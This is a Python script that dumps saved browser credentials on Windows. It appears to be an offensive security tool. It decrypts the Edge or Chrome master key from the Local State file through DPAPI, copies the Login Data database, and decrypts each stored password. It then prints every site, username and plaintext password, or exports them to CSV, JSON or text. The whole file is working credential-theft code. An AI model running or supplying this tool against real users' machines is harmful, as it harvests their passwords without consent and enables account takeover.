#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Title : Windows Edge/Chrome password decryptor 
# Author: Axura - https://4xura.com
#

from __future__ import annotations
import os
import json
import base64
import shutil
import sqlite3
from pathlib import Path
from typing import Iterator, NamedTuple, Optional, ClassVar
from dataclasses import dataclass, field
from contextlib import contextmanager
from Crypto.Cipher import AES
import win32crypt


class DecryptError(RuntimeError):
    """Custom exception for decryption failures."""
    pass


class Credential(NamedTuple):
    """Represents a decrypted credential."""
    url: str
    username: str
    password: str


@dataclass(frozen=True)
class ChromiumGCMBlob:
    """Parsed Chromium AES-GCM encrypted blob."""
    version: str            # "v10", "v11", etc.
    nonce: bytes            # 12 bytes
    ciphertext: bytes       # variable length
    tag: bytes              # 16 bytes GCM authentication tag
    
    VERSION_LENGTH: ClassVar[int] = 3
    NONCE_LENGTH: ClassVar[int] = 12
    TAG_LENGTH: ClassVar[int] = 16
    
    @classmethod
    def parse(cls, blob: bytes) -> ChromiumGCMBlob:
        """Parse Chromium "v10"/"v11" format."""
        min_length = cls.VERSION_LENGTH + cls.NONCE_LENGTH + cls.TAG_LENGTH
        
        if len(blob) < min_length:
            raise DecryptError(f"Blob too short: {len(blob)} < {min_length} bytes")
        
        version = blob[:cls.VERSION_LENGTH].decode('ascii')
        
        # Validate version format
        if not version.startswith('v') or not version[1:].isdigit():
            raise DecryptError(f"Invalid version format: {version!r}")
        
        nonce_start = cls.VERSION_LENGTH
        nonce_end = nonce_start + cls.NONCE_LENGTH
        nonce = blob[nonce_start:nonce_end]
        
        # Everything after nonce is ciphertext + tag
        ciphertext_tag = blob[nonce_end:]
        
        if len(ciphertext_tag) < cls.TAG_LENGTH:
            raise DecryptError(f"Missing GCM tag: {len(ciphertext_tag)} bytes")
        
        ciphertext = ciphertext_tag[:-cls.TAG_LENGTH]
        tag = ciphertext_tag[-cls.TAG_LENGTH:]
        
        return cls(version=version, nonce=nonce, ciphertext=ciphertext, tag=tag)


@dataclass
class EdgePasswordDecryptor:
    """
    Main decryptor class for Edge/Chrome passwords.

    @user_data_dir   : Path to User Data directory
    @local_state_path: Path to Local State file
    @login_data_path : Path to Login Data database
    @temp_db_path    : Temporary database path
    @master_key      : Cached master key (lazily loaded)
    """
    user_data_dir: Optional[str] = None
    local_state_path: Path = field(init=False)
    login_data_path: Path = field(init=False)
    temp_db_path: Path = field(init=False)
    _master_key: Optional[bytes] = field(default=None, init=False, repr=False)
    
    DEFAULT_EDGE_PATH: ClassVar[str] = r"Microsoft\Edge\User Data"
    DEFAULT_CHROME_PATH: ClassVar[str] = r"Google\Chrome\User Data"
    LOCAL_STATE_FILE: ClassVar[str] = "Local State"
    LOGIN_DATA_FILE: ClassVar[str] = "Default\Login Data"
    TEMP_DB_NAME: ClassVar[str] = "login_tmp.db"
    
    def __post_init__(self):
        # Determine user data directory
        if self.user_data_dir:
            base_dir = Path(self.user_data_dir)
        else:
            local_appdata = os.environ.get('LOCALAPPDATA', '')
            if not local_appdata:
                raise DecryptError("LOCALAPPDATA environment variable not found")
            base_dir = Path(local_appdata) / self.DEFAULT_EDGE_PATH
        
        self.local_state_path = base_dir / self.LOCAL_STATE_FILE
        self.login_data_path = base_dir / self.LOGIN_DATA_FILE
        
        temp_dir = Path(os.environ.get('TEMP', os.environ.get('TMP', '/tmp')))
        self.temp_db_path = temp_dir / self.TEMP_DB_NAME

        if not self.local_state_path.exists():
            raise DecryptError(f"Local State not found: {self.local_state_path}")
        
        if not self.login_data_path.exists():
            raise DecryptError(f"Login Data not found: {self.login_data_path}")
    
    @property
    def master_key(self) -> bytes:
        """Lazy-loaded master key property."""
        if self._master_key is None:
            self._master_key = self._extract_master_key()
        return self._master_key
    
    def _extract_master_key(self) -> bytes:
        """Extract and decrypt the master encryption key from Local State."""
        try:
            with open(self.local_state_path, 'r', encoding='utf-8') as f:
                local_state = json.load(f)
            
            # Get encrypted key
            encrypted_key_b64 = local_state['os_crypt']['encrypted_key']
            encrypted_key = base64.b64decode(encrypted_key_b64)
            
            # Remove DPAPI prefix if present
            DPAPI_PREFIX = b'DPAPI'
            if encrypted_key.startswith(DPAPI_PREFIX):
                encrypted_key = encrypted_key[len(DPAPI_PREFIX):]
            
            # Decrypt using Windows DPAPI
            decrypted = win32crypt.CryptUnprotectData(
                encrypted_key,
                None,      # Optional description
                None,      # Optional entropy
                None,      # Reserved
                0          # Flags
            )
            
            master_key = decrypted[1]  # 2nd element is the decrypted data
            
            # Validate key length
            valid_lengths = {16, 24, 32}  # AES-128, AES-192, AES-256
            if len(master_key) not in valid_lengths:
                raise DecryptError(
                    f"Invalid AES key length: {len(master_key)} bytes. "
                    f"Expected one of {valid_lengths}"
                )
            
            return master_key
            
        except KeyError as e:
            raise DecryptError(f"Missing expected field in Local State: {e}") from e
        except (json.JSONDecodeError, base64.binascii.Error) as e:
            raise DecryptError(f"Malformed Local State file: {e}") from e
        except Exception as e:
            raise DecryptError(f"Failed to extract master key: {e}") from e
    
    def decrypt_password(self, encrypted_password: bytes) -> str:
        """Decrypt a password using either AES-GCM (v10+) or DPAPI (legacy)."""
        if not encrypted_password:
            return ""
        
        try:
            # 1) Modern AES-GCM encryption (Edge/Chrome v80+)
            if len(encrypted_password) >= 3 and encrypted_password[:3].startswith(b'v1'):
                blob = ChromiumGCMBlob.parse(encrypted_password)
                
                # Create cipher with GCM mode
                cipher = AES.new(self.master_key, AES.MODE_GCM, nonce=blob.nonce)
                
                # Decrypt and verify authentication tag
                plaintext = cipher.decrypt_and_verify(blob.ciphertext, blob.tag)
                
                # Remove null terminator if present
                if plaintext.endswith(b'\x00'):
                    plaintext = plaintext.rstrip(b'\x00')
                
                return plaintext.decode('utf-8')
            
            # 2) Legacy DPAPI encryption
            else:
                decrypted = win32crypt.CryptUnprotectData(
                    encrypted_password,
                    None, None, None, 0
                )[1]
                return decrypted.decode('utf-8')
                
        except UnicodeDecodeError as e:
            raise DecryptError(f"Failed to decode password as UTF-8: {e}") from e
        except ValueError as e:
            raise DecryptError(f"Cryptographic verification failed: {e}") from e
        except Exception as e:
            raise DecryptError(f"Unexpected decryption error: {e}") from e
    
    @contextmanager
    def _temporary_database(self) -> Iterator[sqlite3.Connection]:
        """
        Creates a copy of the login database (which is locked by the browser),
        yields a connection, and cleans up afterward.
        """
        # Remove any existing temp file
        if self.temp_db_path.exists():
            try:
                os.unlink(self.temp_db_path)
            except OSError:
                pass  
        
        try:
            # Copy the database (browser locks the original)
            shutil.copy2(self.login_data_path, self.temp_db_path)
            
            # Open as read-only with URI parameters 
            uri = f'file:{self.temp_db_path}?mode=ro&immutable=1'
            conn = sqlite3.connect(uri, uri=True)
            conn.row_factory = sqlite3.Row
            
            try:
                yield conn
            finally:
                conn.close()
                
        except sqlite3.Error as e:
            raise DecryptError(f"Database error: {e}") from e
        finally:
            if self.temp_db_path.exists():
                try:
                    os.unlink(self.temp_db_path)
                except OSError:
                    pass  
    
    def extract_credentials(self, max_retries: int = 3) -> Iterator[Credential]:
        """Extract and decrypt all credentials."""
        for attempt in range(1, max_retries + 1):
            try:
                with self._temporary_database() as conn:
                    cursor = conn.cursor()
                    
                    # Query for credentials (excluding empty usernames)
                    query = """
                        SELECT 
                            origin_url, 
                            username_value, 
                            password_value,
                            date_created,
                            times_used
                        FROM logins 
                        WHERE username_value != '' 
                          AND password_value IS NOT NULL
                          AND length(password_value) > 0
                        ORDER BY date_created DESC
                    """
                    
                    cursor.execute(query)
                    
                    for row in cursor:
                        url = row['origin_url']
                        username = row['username_value']
                        encrypted_pwd = row['password_value']
                        
                        try:
                            password = self.decrypt_password(encrypted_pwd)
                            yield Credential(url=url, username=username, password=password)
                            
                        except DecryptError as e:
                            print(f"[WARN] Failed to decrypt for {url}: {e}")
                            continue
                    
                    # Success - break retry loop
                    break
                    
            except (sqlite3.Error, OSError) as e:
                if attempt == max_retries:
                    raise DecryptError(
                        f"Failed after {max_retries} attempts: {e}"
                    ) from e
                print(f"[INFO] Retry {attempt}/{max_retries}: {e}")
                continue
    
    def export_credentials(self, output_path: str, format: str = "csv") -> None:
        """
        Export credentials to a file.
        
        @output_path: Path to output file
        @format: Output format ('csv', 'json', 'txt')
        """
        output_path = Path(output_path)
        
        if format.lower() == "csv":
            import csv
            
            with open(output_path, 'w', newline='', encoding='utf-8') as f:
                writer = csv.writer(f)
                writer.writerow(['URL', 'Username', 'Password', 'Timestamp'])
                
                for cred in self.extract_credentials():
                    writer.writerow([cred.url, cred.username, cred.password])
            
        elif format.lower() == "json":
            import json as json_module
            
            credentials = [
                {
                    'url': cred.url,
                    'username': cred.username,
                    'password': cred.password
                }
                for cred in self.extract_credentials()
            ]
            
            with open(output_path, 'w', encoding='utf-8') as f:
                json_module.dump(credentials, f, indent=2)
            
        elif format.lower() == "txt":
            with open(output_path, 'w', encoding='utf-8') as f:
                for i, cred in enumerate(self.extract_credentials(), 1):
                    f.write(f"[{i}]\n")
                    f.write(f"URL: {cred.url}\n")
                    f.write(f"Username: {cred.username}\n")
                    f.write(f"Password: {cred.password}\n")
                    f.write("-" * 40 + "\n\n")
            
        else:
            raise ValueError(f"Unsupported format: {format}")
        
        print(f"[+] Exported {output_path.stat().st_size} bytes to {output_path}")
    
    def print_summary(self) -> None:
        """Print a summary of extracted credentials."""
        print(f"[*] Source: {self.login_data_path}")
        print(f"[*] Master key size: {len(self.master_key)} bytes")
        print("=" * 60)
        
        count = 0
        for cred in self.extract_credentials():
            count += 1
            print(f"\n[{count}] {cred.url}")
            print(f"    Username: {cred.username}")
            print(f"    Password: {cred.password}")
        
        print(f"\n[+] Total credentials: {count}")
        print("=" * 60)


@dataclass
class DecryptorConfig:
    """Configuration for the decryptor."""
    user_data_dir: Optional[str] = None
    browser: str = "edge"  # "edge" or "chrome"
    output_format: Optional[str] = None
    output_path: Optional[str] = None
    
    def create_decryptor(self) -> EdgePasswordDecryptor:
        """Create a configured decryptor instance."""
        if self.browser.lower() == "chrome":
            # Override default path for Chrome
            local_appdata = os.environ.get('LOCALAPPDATA', '')
            default_dir = Path(local_appdata) / EdgePasswordDecryptor.DEFAULT_CHROME_PATH
            user_dir = self.user_data_dir or str(default_dir)
        else:
            user_dir = self.user_data_dir
        
        return EdgePasswordDecryptor(user_data_dir=user_dir)


def main():
    import argparse
    
    parser = argparse.ArgumentParser(
        description="Decrypt Edge/Chrome passwords under trusted DPAPI context",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter
    )
    
    parser.add_argument(
        '--user-data',
        help="Path to User Data directory"
    )
    
    parser.add_argument(
        '--browser',
        choices=['edge', 'chrome'],
        default='edge',
        help="Browser to target"
    )
    
    parser.add_argument(
        '--output', '-o',
        help="Export to file (CSV, JSON, or TXT based on extension)"
    )
  
    parser.add_argument(
        '--verbose', '-v',
        action='count',
        default=0,
        help="Increase verbosity (use -vv for debug)"
    )
    
    args = parser.parse_args()
    
    config = DecryptorConfig(
        user_data_dir=args.user_data,
        browser=args.browser,
        output_path=args.output,
        output_format=Path(args.output).suffix[1:] if args.output else None
    )
    
    try:
        decryptor = config.create_decryptor()
        
        if args.output:
            decryptor.export_credentials(args.output, config.output_format or "csv")
        else:
            decryptor.print_summary()
        return 0
        
    except DecryptError as e:
        print(f"[ERROR] {e}", file=sys.stderr)
        if args.verbose >= 2:
            import traceback
            traceback.print_exc()
        return 1
    except KeyboardInterrupt:
        print("\n[!] Interrupted", file=sys.stderr)
        return 130
    except Exception as e:
        print(f"[FATAL] {e}", file=sys.stderr)
        if args.verbose:
            import traceback
            traceback.print_exc()
        return 1


if __name__ == "__main__":
    import sys
    sys.exit(main())
